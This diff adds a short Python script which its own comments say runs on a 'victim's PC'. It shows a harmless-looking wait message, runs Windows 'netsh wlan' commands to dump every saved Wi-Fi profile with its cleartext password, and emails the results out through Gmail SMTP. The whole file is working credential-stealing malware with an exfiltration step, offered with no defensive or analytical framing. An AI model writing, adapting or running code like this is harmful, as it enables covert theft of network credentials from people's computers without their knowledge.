@@ -1,0 +1,47 @@
+import subprocess as sp
+import smtplib
+
+print("wait for few seconds :)")
+
+# get the info that we want to send by running the command in victim's PC
+send = []
+
+profile = (
+    sp.check_output(["netsh", "wlan", "show", "profile"]).decode("utf-8").split("\n")
+)  # run the command netsh wland show profile and store in profile variable
+profile = [
+    i.split(":")[1][1:-1] for i in profile if "All User Profile" in i
+]  # make a list of all name of wireless network
+print(profile)
+
+for i in profile:
+    try:
+        result = (
+            sp.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"])
+            .decode("utf-8", "ascii")
+            .split("\n")
+        )
+    except Exception:
+        result = "none"
+    result = [j.split(":")[1][1:-1] for j in result if "Key Content" in j]
+
+    try:
+        send.append(f"{i} > {result[0]}")
+    except Exception:
+        send.append(f"{i} > ")
+
+body = ""
+for i in send:
+    body += i + "\n"
+
+msg = f"subject : hello world \n\n {body}"  # this is our massage
+
+# let's send the massage(msg)
+youremail = "write email here"
+emailpassword = "write email password here"
+with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
+    smtp.starttls()
+    smtp.login(youremail, emailpassword)
+    smtp.sendmail(youremail, youremail, msg)
+
+input()
